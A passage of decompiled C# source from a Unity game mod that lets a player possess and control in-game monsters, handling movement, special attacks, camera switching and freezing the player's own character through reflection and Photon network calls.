				MonoBehaviour[] components = entity.GetComponents<MonoBehaviour>();
				bool flag = false;
				MonoBehaviour[] array = components;
				foreach (MonoBehaviour val in array)
				{
					if (!(val == null))
					{
						string name = ((object)val).GetType().Name;
						if (name == "MushroomZombie")
						{
							SetZombieAITarget(val, charComponent, targetPosition);
							flag = true;
							break;
						}
						if (name == "Scoutmaster")
						{
							SetScoutmasterAITarget(val, charComponent, targetPosition);
							flag = true;
							break;
						}
					}
				}
				if (!flag)
				{
					ProcessMovementInputDirectly(charComponent, targetPosition);
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[EntityControl] Error setting AI target: " + ex.Message));
				ProcessMovementInputDirectly(charComponent, targetPosition);
			}
		}

		private static void SetZombieAITarget(MonoBehaviour zombieComponent, Character charComponent, Vector3 targetPosition)
		{
			try
			{
				Type type = ((object)zombieComponent).GetType();
				PropertyInfo property = type.GetProperty("currentTarget");
				if (property != null && property.CanWrite)
				{
					property.SetValue(zombieComponent, null);
				}
				PropertyInfo property2 = type.GetProperty("currentState");
				if (property2 == null)
				{
					return;
				}
				object value = property2.GetValue(zombieComponent);
				Type nestedType = type.GetNestedType("State");
				if (nestedType == null)
				{
					return;
				}
				object obj = Enum.Parse(nestedType, "Chasing");
				object obj2 = Enum.Parse(nestedType, "Idle");
				if (value == null || (!value.Equals(obj) && !value.Equals(obj2)))
				{
					object obj3 = Enum.Parse(nestedType, "Dead");
					object obj4 = Enum.Parse(nestedType, "Lunging");
					object obj5 = Enum.Parse(nestedType, "LungeRecovery");
					object obj6 = Enum.Parse(nestedType, "WakingUp");
					if (!value.Equals(obj3) && !value.Equals(obj4) && !value.Equals(obj5) && !value.Equals(obj6))
					{
						MethodInfo method = type.GetMethod("StartIdle", BindingFlags.Instance | BindingFlags.NonPublic);
						if (method != null)
						{
							method.Invoke(zombieComponent, null);
						}
					}
				}
				EntityWalkTowards(charComponent, targetPosition);
				if (Input.GetKey((KeyCode)304))
				{
					charComponent.input.sprintIsPressed = true;
					charComponent.data.isSprinting = true;
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[EntityControl] Error setting zombie AI target: " + ex.Message));
			}
		}

		private static void SetScoutmasterAITarget(MonoBehaviour scoutmasterComponent, Character charComponent, Vector3 targetPosition)
		{
			try
			{
				PropertyInfo property = ((object)scoutmasterComponent).GetType().GetProperty("currentTarget");
				if (property != null && property.CanWrite)
				{
					property.SetValue(scoutmasterComponent, null);
				}
				EntityWalkTowards(charComponent, targetPosition);
				if (Input.GetKey((KeyCode)304))
				{
					charComponent.input.sprintIsPressed = true;
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[EntityControl] Error setting scoutmaster AI target: " + ex.Message));
			}
		}

		private static void ProcessMovementInputDirectly(Character charComponent, Vector3 targetPosition)
		{
			if (!(charComponent == null) && !(charComponent.input == null))
			{
				EntityWalkTowards(charComponent, targetPosition);
				if (Input.GetKey((KeyCode)304))
				{
					charComponent.input.sprintIsPressed = true;
				}
			}
		}

		private static void MaintainEntityInputAfterAI(Character charComponent, Vector3 targetPosition)
		{
			if (charComponent == null || charComponent.input == null)
			{
				return;
			}
			Vector2 zero = Vector2.zero;
			if (Input.GetKey((KeyCode)119))
			{
				zero.y += 1f;
			}
			if (Input.GetKey((KeyCode)115))
			{
				zero.y -= 1f;
			}
			if (Input.GetKey((KeyCode)97))
			{
				zero.x -= 1f;
			}
			if (Input.GetKey((KeyCode)100))
			{
				zero.x += 1f;
			}
			if (((Vector2)(ref zero)).magnitude > 0.1f)
			{
				EntityWalkTowards(charComponent, targetPosition);
				if (Input.GetKey((KeyCode)304))
				{
					charComponent.input.sprintIsPressed = true;
					charComponent.data.isSprinting = true;
				}
			}
		}

		public static void MaintainPlayerInputAfterAI(Character charComponent)
		{
			if (!(charComponent == null) && !(charComponent.input == null))
			{
				Vector3 targetPosition = CalculatePlayerTargetPosition(charComponent);
				MaintainEntityInputAfterAI(charComponent, targetPosition);
			}
		}

		private static void HelpZombieRecoverFromLunge(GameObject entity, Character charComponent)
		{
			MonoBehaviour component = entity.GetComponent<MushroomZombie>();
			if (component == null)
			{
				return;
			}
			try
			{
				Type type = ((object)component).GetType();
				if (type.Name != "MushroomZombie")
				{
					return;
				}
				PropertyInfo property = type.GetProperty("currentState");
				if (property == null)
				{
					return;
				}
				object value = property.GetValue(component);
				Type nestedType = type.GetNestedType("State");
				if (nestedType == null)
				{
					return;
				}
				object obj = Enum.Parse(nestedType, "LungeRecovery");
				object obj2 = Enum.Parse(nestedType, "Lunging");
				if (value == null || (!value.Equals(obj) && !value.Equals(obj2)))
				{
					return;
				}
				FieldInfo field = type.GetField("timeSpentRecoveringFromLunge", BindingFlags.Instance | BindingFlags.NonPublic);
				FieldInfo field2 = type.GetField("lungeRecoveryTime", BindingFlags.Instance | BindingFlags.Public);
				FieldInfo field3 = type.GetField("timeSpentLunging", BindingFlags.Instance | BindingFlags.NonPublic);
				FieldInfo field4 = type.GetField("lungeTime", BindingFlags.Instance | BindingFlags.Public);
				bool flag = false;
				if (value.Equals(obj))
				{
					if (field != null && field2 != null)
					{
						float num = (float)field.GetValue(component);
						_ = (float)field2.GetValue(component);
						if (num > 0.1f)
						{
							flag = true;
						}
					}
				}
				else if (value.Equals(obj2) && field3 != null && field4 != null)
				{
					float num2 = (float)field3.GetValue(component);
					float num3 = (float)field4.GetValue(component);
					if (num2 >= num3)
					{
						flag = true;
					}
				}
				if (flag)
				{
					charComponent.data.fallSeconds = 0f;
					charComponent.data.passedOut = false;
					charComponent.data.fullyPassedOut = false;
					charComponent.data.isGrounded = true;
					charComponent.data.sinceGrounded = 0f;
					if (field != null && field2 != null)
					{
						float num4 = (float)field2.GetValue(component);
						field.SetValue(component, num4 + 1f);
					}
					MethodInfo method = type.GetMethod("StartChasing", BindingFlags.Instance | BindingFlags.NonPublic);
					if (method != null)
					{
						method.Invoke(component, null);
						Debug.Log((object)"[EntityControl] Force recovered zombie from lunge");
					}
				}
			}
			catch
			{
			}
		}

		private static void ProcessSpecialAbilities(GameObject entity, Character charComponent)
		{
			if (Input.GetKeyDown((KeyCode)323) || Input.GetKeyDown((KeyCode)101))
			{
				TryZombieLunge(entity, charComponent);
			}
			if (Input.GetKey((KeyCode)324) || Input.GetKey((KeyCode)102))
			{
				TryScoutmasterThrow(entity, charComponent);
				return;
			}
			PhotonView component = entity.GetComponent<PhotonView>();
			if (!(component != null) || !component.IsMine || !charComponent.data.isReaching)
			{
				return;
			}
			FieldInfo field = typeof(CharacterData).GetField("grabbedPlayer", BindingFlags.Instance | BindingFlags.NonPublic);
			Character val = null;
			if (field != null)
			{
				object value = field.GetValue(charComponent.data);
				val = (Character)((value is Character) ? value : null);
			}
			if (val == null)
			{
				component.RPC("RPCA_StopReaching", RpcTarget.All, Array.Empty<object>());
				FieldInfo field2 = typeof(CharacterData).GetField("sincePressReach", BindingFlags.Instance | BindingFlags.Public);
				if (field2 != null)
				{
					field2.SetValue(charComponent.data, 10f);
				}
			}
		}

		private static void TryZombieLunge(GameObject entity, Character charComponent)
		{
			MonoBehaviour[] components = entity.GetComponents<MonoBehaviour>();
			MonoBehaviour val = null;
			Type type = null;
			MonoBehaviour[] array = components;
			foreach (MonoBehaviour val2 in array)
			{
				if (val2 != null && ((object)val2).GetType().Name == "MushroomZombie")
				{
					val = val2;
					type = ((object)val2).GetType();
					break;
				}
			}
			if (val == null || type == null)
			{
				return;
			}
			try
			{
				PropertyInfo property = type.GetProperty("currentState");
				if (property == null || !charComponent.data.isGrounded)
				{
					return;
				}
				object value = property.GetValue(val);
				Type nestedType = type.GetNestedType("State");
				PropertyInfo property2 = type.GetProperty("currentTarget");
				Character val3 = null;
				if (property2 != null)
				{
					object value2 = property2.GetValue(val);
					val3 = (Character)((value2 is Character) ? value2 : null);
					if (val3 == null)
					{
						val3 = GetNearestPlayer(charComponent, 50f, includeBots: true);
						if (val3 != null)
						{
							MethodInfo method = type.GetMethod("SetCurrentTarget", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
							if (method != null)
							{
								method.Invoke(val, new object[2] { val3, 0f });
							}
						}
					}
				}
				if (!(val3 != null) || !(nestedType != null))
				{
					return;
				}
				object obj = Enum.Parse(nestedType, "Chasing");
				if (value == null || !value.Equals(obj))
				{
					MethodInfo method2 = type.GetMethod("StartChasing", BindingFlags.Instance | BindingFlags.NonPublic);
					if (method2 != null)
					{
						method2.Invoke(val, null);
					}
				}
				float num = Vector3.Distance(charComponent.Center, val3.Center);
				float num2 = 10f;
				FieldInfo field = type.GetField("zombieLungeDistance", BindingFlags.Instance | BindingFlags.Public);
				if (field != null)
				{
					num2 = (float)field.GetValue(val);
				}
				bool flag = EntityCanSeeTarget(charComponent, val3);
				float num3 = 3f;
				FieldInfo field2 = type.GetField("chaseTimeBeforeSprint", BindingFlags.Instance | BindingFlags.Public);
				if (field2 != null)
				{
					num3 = (float)field2.GetValue(val);
				}
				float num4 = 0f;
				FieldInfo field3 = type.GetField("timeSpentChasing", BindingFlags.Instance | BindingFlags.NonPublic);
				if (field3 != null)
				{
					num4 = (float)field3.GetValue(val);
				}
				bool flag2 = num4 > num3;
				if (num <= num2 * 1.5f && flag)
				{
					object value3 = property.GetValue(val);
					if (value3 == null || !value3.Equals(obj))
					{
						MethodInfo method3 = type.GetMethod("StartChasing", BindingFlags.Instance | BindingFlags.NonPublic);
						if (method3 != null)
						{
							method3.Invoke(val, null);
						}
					}
					charComponent.input.sprintIsPressed = true;
					charComponent.data.isSprinting = true;
					EntityLookAt(charComponent, val3.Head);
					MethodInfo method4 = type.GetMethod("StartLunging", BindingFlags.Instance | BindingFlags.NonPublic);
					if (method4 != null)
					{
						method4.Invoke(val, null);
						Debug.Log((object)$"[EntityControl] Triggered zombie lunge at distance {num:F1}m");
						return;
					}
					object value4 = Enum.Parse(nestedType, "Lunging");
					property.SetValue(val, value4);
					FieldInfo field4 = type.GetField("lungeTargetForward", BindingFlags.Instance | BindingFlags.NonPublic);
					if (field4 != null)
					{
						Vector3 val4 = charComponent.Center + (val3.Head - charComponent.Center) * 100f;
						field4.SetValue(val, val4);
					}
					charComponent.input.jumpWasPressed = true;
					Debug.Log((object)$"[EntityControl] Manually triggered zombie lunge state at distance {num:F1}m");
				}
				else if (num > num2 * 1.5f)
				{
					if (charComponent.data.isClimbing)
					{
						EntityClimbTowards(charComponent, val3.Head);
					}
					else
					{
						EntityWalkTowards(charComponent, val3.Head);
					}
					float num5 = 20f;
					FieldInfo field5 = type.GetField("zombieSprintDistance", BindingFlags.Instance | BindingFlags.Public);
					if (field5 != null)
					{
						num5 = (float)field5.GetValue(val);
					}
					if (flag2 && num < num5 && flag)
					{
						charComponent.input.sprintIsPressed = true;
						charComponent.data.isSprinting = true;
					}
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[EntityControl] Could not trigger zombie lunge: " + ex.Message));
			}
		}

		private static void TryScoutmasterThrow(GameObject entity, Character charComponent)
		{
			MonoBehaviour[] components = entity.GetComponents<MonoBehaviour>();
			MonoBehaviour val = null;
			Type type = null;
			MonoBehaviour[] array = components;
			foreach (MonoBehaviour val2 in array)
			{
				if (val2 != null && ((object)val2).GetType().Name == "Scoutmaster")
				{
					val = val2;
					type = ((object)val2).GetType();
					break;
				}
			}
			if (val == null || type == null)
			{
				return;
			}
			try
			{
				PhotonView component = entity.GetComponent<PhotonView>();
				if (component == null || !component.IsMine)
				{
					return;
				}
				FieldInfo field = typeof(CharacterData).GetField("grabbedPlayer", BindingFlags.Instance | BindingFlags.NonPublic);
				Character val3 = null;
				if (field != null)
				{
					object value = field.GetValue(charComponent.data);
					val3 = (Character)((value is Character) ? value : null);
				}
				if (val3 != null)
				{
					if (val3.data != null)
					{
						val3.data.sinceGrounded = 0f;
					}
					charComponent.input.useSecondaryIsPressed = true;
					Vector3 lookDirection = charComponent.data.lookDirection;
					lookDirection.y = 0.6f;
					(lookDirection).Normalize();
					Vector3 lookAtPos = charComponent.Head + lookDirection * 10f;
					EntityLookAt(charComponent, lookAtPos);
					FieldInfo field2 = type.GetField("isThrowing", BindingFlags.Instance | BindingFlags.NonPublic);
					bool flag = false;
					if (field2 != null)
					{
						flag = (bool)field2.GetValue(val);
					}
					if (!flag)
					{
						component.RPC("RPCA_Throw", RpcTarget.All, Array.Empty<object>());
						Debug.Log((object)"[EntityControl] Triggered scoutmaster throw");
					}
					return;
				}
				Character nearestPlayer = GetNearestPlayer(charComponent, 3.5f, includeBots: true);
				if (nearestPlayer != null)
				{
					MethodInfo method = type.GetMethod("SetCurrentTarget", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
					if (method != null)
					{
						method.Invoke(val, new object[2] { nearestPlayer, 5f });
					}
					EntityLookAt(charComponent, nearestPlayer.Head);
					float num = Vector3.Distance(charComponent.Center, nearestPlayer.Center);
					if (charComponent.data.isGrounded && !charComponent.data.isClimbing && num < 3.5f)
					{
						FieldInfo field3 = typeof(CharacterData).GetField("sincePressReach", BindingFlags.Instance | BindingFlags.Public);
						if (field3 != null)
						{
							field3.SetValue(charComponent.data, 0f);
						}
						charComponent.input.useSecondaryIsPressed = true;
						if (!charComponent.data.isReaching)
						{
							component.RPC("RPCA_StartReaching", RpcTarget.All, Array.Empty<object>());
						}
						Debug.Log((object)$"[EntityControl] Scoutmaster grab active - target at distance {num:F1}m");
					}
					else
					{
						if (charComponent.data.isClimbing)
						{
							EntityClimbTowards(charComponent, nearestPlayer.Head);
						}
						else
						{
							EntityWalkTowards(charComponent, nearestPlayer.Head);
						}
						if (num < 15f)
						{
							charComponent.input.sprintIsPressed = true;
						}
					}
				}
				else
				{
					FieldInfo field4 = typeof(CharacterData).GetField("sincePressReach", BindingFlags.Instance | BindingFlags.Public);
					if (field4 != null)
					{
						field4.SetValue(charComponent.data, 0f);
					}
					charComponent.input.useSecondaryIsPressed = true;
					if (!charComponent.data.isReaching)
					{
						component.RPC("RPCA_StartReaching", RpcTarget.All, Array.Empty<object>());
					}
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[EntityControl] Could not trigger scoutmaster throw: " + ex.Message));
			}
		}

		private static Character GetNearestPlayer(Character entityChar, float maxDistance = 50f, bool includeBots = false)
		{
			Character result = null;
			float num = float.MaxValue;
			foreach (Character allCharacter in Character.AllCharacters)
			{
				if (!((Object)(object)allCharacter == (Object)(object)entityChar) && !((Object)(object)allCharacter == (Object)(object)Character.localCharacter) && !(allCharacter.data == null) && !allCharacter.data.dead && !allCharacter.data.fullyPassedOut && (includeBots || !allCharacter.isBot))
				{
					float num2 = Vector3.Distance(entityChar.Center, allCharacter.Center);
					if (num2 < num && num2 <= maxDistance)
					{
						result = allCharacter;
						num = num2;
					}
				}
			}
			return result;
		}

		public static void UpdateCamera()
		{
			if (Camera.main == null)
			{
				return;
			}
			Character controlledEntityCharacter = GetControlledEntityCharacter();
			if (controlledEntityCharacter == null || controlledEntityCharacter.data == null || controlledEntityCharacter.refs == null)
			{
				return;
			}
			try
			{
				Vector3 zero = Vector3.zero;
				if (controlledEntityCharacter.refs != null && controlledEntityCharacter.refs.head != null)
				{
					float num = -0.3f;
					zero = controlledEntityCharacter.refs.head.transform.TransformPoint(Vector3.up * 0.1f + Vector3.forward * num);
				}
				else
				{
					zero = controlledEntityCharacter.transform.position + Vector3.up * 1.6f;
				}
				Quaternion cameraRot = ((controlledEntityCharacter.refs == null || !(controlledEntityCharacter.refs.head != null)) ? Quaternion.LookRotation(controlledEntityCharacter.data.lookDirection) : controlledEntityCharacter.refs.head.transform.rotation);
				ApplyGameFeelRotation(ref cameraRot);
				Camera.main.transform.position = zero;
				Camera.main.transform.rotation = cameraRot;
				UpdateCameraOverride(zero, cameraRot);
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[EntityControl] Error updating camera: " + ex.Message));
			}
		}

		private static void FreezePlayer()
		{
			if (Character.localCharacter == null || Character.localCharacter.refs == null)
			{
				return;
			}
			if (!_playerPositionFrozen)
			{
				_frozenPlayerPosition = Character.localCharacter.transform.position;
				_playerPositionFrozen = true;
			}
			if (Character.localCharacter.refs.ragdoll != null && Character.localCharacter.refs.ragdoll.partList != null)
			{
				if (_playerBodypartKinematicStates.Count == 0)
				{
					foreach (Bodypart part in Character.localCharacter.refs.ragdoll.partList)
					{
						if (part != null && part.Rig != null)
						{
							_playerBodypartKinematicStates[part] = part.Rig.isKinematic;
							_playerBodypartConstraintStates[part] = part.Rig.constraints;
						}
					}
				}
				foreach (Bodypart part2 in Character.localCharacter.refs.ragdoll.partList)
				{
					if (part2 != null && part2.Rig != null)
					{
						part2.Rig.isKinematic = true;
						part2.Rig.linearVelocity = Vector3.zero;
						part2.Rig.angularVelocity = Vector3.zero;
					}
				}
			}
			MainCameraMovement instance = Singleton<MainCameraMovement>.Instance;
			if (instance != null)
			{
				FieldInfo field = typeof(MainCameraMovement).GetField("isGodCam", BindingFlags.Instance | BindingFlags.NonPublic);
				if (field != null)
				{
					field.SetValue(instance, true);
				}
			}
			if (Character.localCharacter.refs.movement != null)
			{
				((Behaviour)Character.localCharacter.refs.movement).enabled = false;
			}
		}

		private static void KeepPlayerFrozen()
		{
			if (!_playerPositionFrozen || Character.localCharacter == null)
			{
				return;
			}
			Character.localCharacter.transform.position = _frozenPlayerPosition;
			if (Character.localCharacter.refs?.ragdoll?.partList != null)
			{
				foreach (Bodypart part in Character.localCharacter.refs.ragdoll.partList)
				{
					if ((Object)(object)((part != null) ? part.Rig : null) != (Object)null)
					{
						part.Rig.isKinematic = true;
						part.Rig.linearVelocity = Vector3.zero;
						part.Rig.angularVelocity = Vector3.zero;
					}
				}
			}
			if (Character.localCharacter.data != null)
			{
				Character.localCharacter.data.isGrounded = true;
				Character.localCharacter.data.sinceGrounded = 0f;
			}
			if (Character.localCharacter.input != null)
			{
				Character.localCharacter.input.movementInput = Vector2.zero;
				Character.localCharacter.input.lookInput = Vector2.zero;
				Character.localCharacter.input.jumpIsPressed = false;
				Character.localCharacter.input.jumpWasPressed = false;
				Character.localCharacter.input.sprintIsPressed = false;
				Character.localCharacter.input.sprintWasPressed = false;
				Character.localCharacter.input.usePrimaryIsPressed = false;
				Character.localCharacter.input.useSecondaryIsPressed = false;
				Character.localCharacter.input.interactIsPressed = false;
				Character.localCharacter.input.dropIsPressed = false;
			}
		}

		private static void UnfreezePlayer()
		{
			if (Character.localCharacter == null || Character.localCharacter.refs == null)
			{
				return;
			}
			if (Character.localCharacter.refs.ragdoll != null && Character.localCharacter.refs.ragdoll.partList != null)
			{
				foreach (Bodypart part in Character.localCharacter.refs.ragdoll.partList)
				{
					if (part != null && part.Rig != null)
					{
						if (_playerBodypartKinematicStates.ContainsKey(part))
						{
							part.Rig.isKinematic = _playerBodypartKinematicStates[part];
						}
						if (_playerBodypartConstraintStates.ContainsKey(part))
						{
							part.Rig.constraints = _playerBodypartConstraintStates[part];
						}
					}
				}
				_playerBodypartKinematicStates.Clear();
				_playerBodypartConstraintStates.Clear();
			}
			_playerPositionFrozen = false;
			if (Character.localCharacter.refs.movement != null)
			{
				((Behaviour)Character.localCharacter.refs.movement).enabled = true;
			}
			MainCameraMovement instance = Singleton<MainCameraMovement>.Instance;
			if (instance != null)
			{
				FieldInfo field = typeof(MainCameraMovement).GetField("isGodCam", BindingFlags.Instance | BindingFlags.NonPublic);
				if (field != null)
				{
					field.SetValue(instance, false);
				}
			}
		}

		private static void MakeHeadInvisible(GameObject entity, Character charComponent)
		{
			if ((Object)(object)charComponent.refs?.head == (Object)null)
			{
				return;
			}
			if (!_originalHeadRendererStates.ContainsKey(entity))
			{
				_originalHeadRendererStates[entity] = new Dictionary<Renderer, bool>();
			}
			Renderer[] componentsInChildren = charComponent.refs.head.gameObject.GetComponentsInChildren<Renderer>(true);
			foreach (Renderer val in componentsInChildren)
			{
				if (val != null && !_originalHeadRendererStates[entity].ContainsKey(val))
				{
					_originalHeadRendererStates[entity][val] = val.enabled;
					val.enabled = false;
				}
			}
			SkinnedMeshRenderer[] componentsInChildren2 = charComponent.refs.head.gameObject.GetComponentsInChildren<SkinnedMeshRenderer>(true);
			foreach (SkinnedMeshRenderer val2 in componentsInChildren2)
			{
				if (val2 != null && !_originalHeadRendererStates[entity].ContainsKey((Renderer)(object)val2))
				{
					_originalHeadRendererStates[entity][(Renderer)(object)val2] = ((Renderer)val2).enabled;
					((Renderer)val2).enabled = false;
				}
			}
		}

		private static void RestoreHeadVisibility(GameObject entity)
		{
			if (entity == null)
			{
				return;
			}
			Character component = entity.GetComponent<Character>();
			if ((Object)(object)component?.refs?.head == (Object)null)
			{
				if (_originalHeadRendererStates.ContainsKey(entity))
				{
					_originalHeadRendererStates.Remove(entity);
				}
				return;
			}
			if (_originalHeadRendererStates.ContainsKey(entity))
			{
				foreach (KeyValuePair<Renderer, bool> item in _originalHeadRendererStates[entity])
				{
					if (item.Key != null)
					{
						try
						{
							item.Key.enabled = item.Value;
						}
						catch
						{
						}
					}
				}
				_originalHeadRendererStates.Remove(entity);
				return;
			}
			Renderer[] componentsInChildren = component.refs.head.gameObject.GetComponentsInChildren<Renderer>(true);
			foreach (Renderer val in componentsInChildren)
			{
				if (val != null)
				{
					try
					{
						val.enabled = true;
					}
					catch
					{
					}
				}
			}
			SkinnedMeshRenderer[] componentsInChildren2 = component.refs.head.gameObject.GetComponentsInChildren<SkinnedMeshRenderer>(true);
			foreach (SkinnedMeshRenderer val2 in componentsInChildren2)
			{
				if (val2 != null)
				{
					try
					{
						((Renderer)val2).enabled = true;
					}
					catch
					{
					}
				}
			}
		}

		private static void PrepareEntityForPlayerControl(GameObject entity)
		{
			if (entity == null)
			{
				return;
			}
			MonoBehaviour[] components = entity.GetComponents<MonoBehaviour>();
			foreach (MonoBehaviour val in components)
			{
				if (!(val == null))
				{
					string name = ((object)val).GetType().Name;
					if (name == "Scoutmaster" || name == "MushroomZombie")
					{
						Debug.Log((object)("[EntityControl] " + name + " component kept enabled - will use AI logic with player input"));
					}
				}
			}
			if (!_disabledAIComponentsByEntity.ContainsKey(entity))
			{
				_disabledAIComponentsByEntity[entity] = new List<MonoBehaviour>();
			}
		}

		private static void RestoreEntityAI(GameObject entity)
		{
			if (!(entity == null))
			{
				if (_disabledAIComponentsByEntity.ContainsKey(entity))
				{
					_disabledAIComponentsByEntity.Remove(entity);
				}
				Debug.Log((object)"[EntityControl] Entity AI restored to normal operation");
			}
		}

		private static void EnableEntityComponents(GameObject entity, Character charComponent)
		{
			CharacterMovement component = entity.GetComponent<CharacterMovement>();
			if (component != null && !((Behaviour)component).enabled)
			{
				((Behaviour)component).enabled = true;
			}
			if (!((Behaviour)charComponent).enabled)
			{
				((Behaviour)charComponent).enabled = true;
			}
		}

		private static void TransferOwnership(GameObject entity)
		{
			PhotonView component = entity.GetComponent<PhotonView>();
			if (component != null && !component.IsMine)
			{
				try
				{
					component.TransferOwnership(PhotonNetwork.LocalPlayer);
				}
				catch
				{
				}
			}
		}

		private static void SetEntitySpectatable(Character charComponent)
		{
			if (!(charComponent.data == null))
			{
				PropertyInfo property = typeof(CharacterData).GetProperty("canBeSpectated", BindingFlags.Instance | BindingFlags.Public);
				if (property != null && property.CanWrite)
				{
					property.SetValue(charComponent.data, true);
				}
			}
		}

		private static void SwitchCameraToEntity(GameObject entity)
		{
			if (!((Object)(object)entity.GetComponent<Character>() == (Object)null))
			{
				MainCamera instance = MainCamera.instance;
				if (instance != null)
				{
					GameObject val = new GameObject("EntityCameraOverride");
					CameraOverride cameraOverride = val.AddComponent<CameraOverride>();
					instance.SetCameraOverride(cameraOverride);
					_cameraOverrideObject = val;
				}
			}
		}

		private static void RestoreCameraToPlayer()
		{
			MainCamera instance = MainCamera.instance;
			if (instance != null)
			{
				instance.SetCameraOverride((CameraOverride)null);
			}
			if (_cameraOverrideObject != null)
			{
				Object.Destroy((Object)(object)_cameraOverrideObject);
				_cameraOverrideObject = null;
			}
		}

		private static void EnsureOwnership(GameObject entity)
		{
			PhotonView component = entity.GetComponent<PhotonView>();
			if (component != null && !component.IsMine)
			{
				try
				{
					component.TransferOwnership(PhotonNetwork.LocalPlayer);
				}
				catch
				{
				}
			}
		}

		private static void ProcessMovementInput(Character charComponent)
		{
			Vector2 val = Vector2.zero;
			if (Input.GetKey((KeyCode)119))
			{
				val.y += 1f;
			}
			if (Input.GetKey((KeyCode)115))
			{
				val.y -= 1f;
			}
			if (Input.GetKey((KeyCode)97))
			{
				val.x -= 1f;
			}
			if (Input.GetKey((KeyCode)100))
			{
				val.x += 1f;
			}
			if (((Vector2)(ref val)).magnitude > 1f)
			{
				val = ((Vector2)(ref val)).normalized;
			}
			charComponent.input.movementInput = val;
			if ((Object)(object)charComponent.refs?.climbing != (Object)null && val.y > 0.1f)
			{
				try
				{
					MethodInfo method = ((object)charComponent.refs.climbing).GetType().GetMethod("TryClimb", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
					if (method != null)
					{
						method.Invoke(charComponent.refs.climbing, new object[1] { 1.25f });
					}
				}
				catch
				{
				}
			}
			if (charComponent.data != null && charComponent.data.isClimbing && Input.GetKey((KeyCode)304) && ((Vector2)(ref val)).magnitude > 0.1f)
			{
				charComponent.input.sprintIsPressed = true;
				charComponent.input.sprintToggleIsPressed = true;
				charComponent.input.sprintWasPressed = true;
				charComponent.input.sprintToggleWasPressed = true;
			}
		}

		private static void ProcessJumpInput(Character charComponent, MonoBehaviour coroutineRunner)
		{
			if (Input.GetKeyDown((KeyCode)32))
			{
				if (!charComponent.input.jumpIsPressed && !charComponent.input.jumpWasPressed)
				{
					charComponent.input.jumpWasPressed = true;
					charComponent.input.jumpIsPressed = true;
					coroutineRunner.StartCoroutine(ResetJumpInput(charComponent));
				}
			}
			else if (Input.GetKeyUp((KeyCode)32))
			{
				charComponent.input.jumpIsPressed = false;
				charComponent.input.jumpWasPressed = false;
			}
		}

		[IteratorStateMachine(typeof(<ResetJumpInput>d__45))]
		private static IEnumerator ResetJumpInput(Character character)
		{
			return new <ResetJumpInput>d__45(0)
			{
				character = character
			};
		}

		public static void ProcessMouseLookOnly(Character charComponent)
		{
			if (charComponent == null || charComponent.input == null || charComponent.data == null)
			{
				return;
			}
			float axis = Input.GetAxis("Mouse X");
			float axis2 = Input.GetAxis("Mouse Y");
			charComponent.input.lookInput = new Vector2(axis, axis2);
			if (!((Object)(object)charComponent.refs?.movement != (Object)null))
			{
				return;
			}
			CharacterMovement movement = charComponent.refs.movement;
			float num = 0.1f;
			int num2 = 1;
			int num3 = 1;
			try
			{
				FieldInfo field = typeof(CharacterMovement).GetField("mouseSensSetting", BindingFlags.Instance | BindingFlags.NonPublic);
				if (field != null)
				{
					object value = field.GetValue(movement);
					if (value != null)
					{
						PropertyInfo property = value.GetType().GetProperty("Value");
						if (property != null)
						{
							float num4 = (float)property.GetValue(value);
							num = 0.1f * num4;
						}
					}
				}
				FieldInfo field2 = typeof(CharacterMovement).GetField("invertXSetting", BindingFlags.Instance | BindingFlags.NonPublic);
				if (field2 != null)
				{
					object value2 = field2.GetValue(movement);
					if (value2 != null)
					{
						PropertyInfo property2 = value2.GetType().GetProperty("Value");
						if (property2 != null)
						{
							object value3 = property2.GetValue(value2);
							if (value3 != null && value3.ToString() != "OFF" && value3.ToString() != "0")
							{
								num2 = -1;
							}
						}
					}
				}
				FieldInfo field3 = typeof(CharacterMovement).GetField("invertYSetting", BindingFlags.Instance | BindingFlags.NonPublic);
				if (field3 != null)
				{
					object value4 = field3.GetValue(movement);
					if (value4 != null)
					{
						PropertyInfo property3 = value4.GetType().GetProperty("Value");
						if (property3 != null)
						{
							object value5 = property3.GetValue(value4);
							if (value5 != null && value5.ToString() != "OFF" && value5.ToString() != "0")
							{
								num3 = -1;
							}
						}
					}
				}
			}
			catch
			{
			}
			Vector2 lookInput = charComponent.input.lookInput;
			if (((Vector2)(ref lookInput)).magnitude > 0.01f)
			{
				charComponent.data.lookValues.x += lookInput.x * num * (float)num2;
				charComponent.data.lookValues.y += lookInput.y * num * (float)num3;
				charComponent.data.lookValues.y = Mathf.Clamp(charComponent.data.lookValues.y, -85f, 85f);
				MethodInfo method = typeof(Character).GetMethod("RecalculateLookDirections", BindingFlags.Instance | BindingFlags.NonPublic);
				if (method != null)
				{
					method.Invoke(charComponent, null);
				}
			}
		}

		private static void ProcessMouseLook(Character charComponent)
		{
			ProcessMouseLookOnly(charComponent);
		}

		private static void EntityLookAt(Character charComponent, Vector3 lookAtPos)
		{
			if (charComponent == null || charComponent.data == null || charComponent.refs == null)
			{
				return;
			}
			try
			{
				Type type = Type.GetType("HelperFunctions");
				if (type != null)
				{
					MethodInfo method = type.GetMethod("DirectionToLook", BindingFlags.Static | BindingFlags.Public, null, new Type[1] { typeof(Vector3) }, null);
					if (method != null)
					{
						Vector3 val = lookAtPos - charComponent.Head;
						Vector2 lookValues = (Vector2)method.Invoke(null, new object[1] { val });
						charComponent.data.lookValues = lookValues;
						MethodInfo method2 = typeof(Character).GetMethod("RecalculateLookDirections", BindingFlags.Instance | BindingFlags.NonPublic);
						if (method2 != null)
						{
							method2.Invoke(charComponent, null);
						}
						return;
					}
				}
				Vector3 val2 = lookAtPos - charComponent.Head;
				Vector3 normalized = (val2).normalized;
				float num = Mathf.Atan2(normalized.x, normalized.z) * 57.29578f;
				float num2 = (0f - Mathf.Asin(normalized.y)) * 57.29578f;
				charComponent.data.lookValues = new Vector2(num, num2);
				MethodInfo method3 = typeof(Character).GetMethod("RecalculateLookDirections", BindingFlags.Instance | BindingFlags.NonPublic);
				if (method3 != null)
				{
					method3.Invoke(charComponent, null);
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[EntityControl] EntityLookAt failed: " + ex.Message));
			}
		}

